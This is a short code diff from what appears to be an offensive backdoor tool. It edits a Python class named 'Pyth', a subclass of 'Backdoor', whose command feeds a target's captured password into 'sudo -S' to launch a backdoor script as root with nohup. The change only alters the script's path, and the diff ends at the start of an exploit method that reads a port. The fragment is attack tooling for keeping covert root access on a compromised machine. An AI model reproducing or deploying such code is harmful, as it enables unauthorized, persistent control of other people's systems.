@@ -14,7 +14,7 @@ class Pyth(Backdoor):
         self.allow_modules = True
 
     def get_command(self):
-        return  "echo " + self.core.curtarget.pword + " | sudo -S nohup python pythBackdoor.py"
+        return  "echo " + self.core.curtarget.pword + " | sudo -S nohup python ~/pythBackdoor.py"
 
     def do_exploit(self, args):
         port = self.get_value("port")
